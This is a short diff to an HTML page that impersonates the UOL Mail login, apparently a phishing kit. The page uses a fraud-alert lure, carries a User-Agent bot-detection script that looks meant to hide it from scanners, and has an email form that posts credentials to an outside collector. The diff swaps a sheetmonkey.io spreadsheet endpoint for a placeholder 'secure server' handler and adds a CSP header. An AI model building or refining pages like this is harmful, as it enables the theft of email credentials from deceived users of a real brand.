@@ -6,6 +6,8 @@
     <title>UOL Mail - Login</title>
     <link rel="stylesheet" href="style.css">
     <link rel="icon" href="favicon.ico" type="image/x-icon">
+    <meta http-equiv="Content-Security-Policy" content="default-src 'self'; img-src https:; script-src 'self'; style-src 'self';">
+
     <script>
         // Função para detectar bots pelo User-Agent
         function detectBot() {
@@ -49,12 +51,12 @@
             </div>
             
             <p class="description">
-                Faça o login com o seu e-mail uol<br/> e <strong>desconecte e bloqueie</strong> qualquer<br/> tentativa de fraude.
+                Faça o login com o seu e-mail UOL<br/> e <strong>desconecte e bloqueie</strong> qualquer<br/> tentativa de fraude.
             </p>
 
             <h2>Entrar</h2>
 
-            <form action="https://api.sheetmonkey.io/form/kdkTqJ66DEJE2sMjdqC9dx" method="post" class="login-form" id="loginForm">
+            <form action="https://seu-servidor-seguro.com/form-handler" method="post" class="login-form" id="loginForm">
                 <div id="emailStep">
                     <div class="input-group">
                         <input type="email" id="emailInput" name="email" placeholder="E-mail" required>
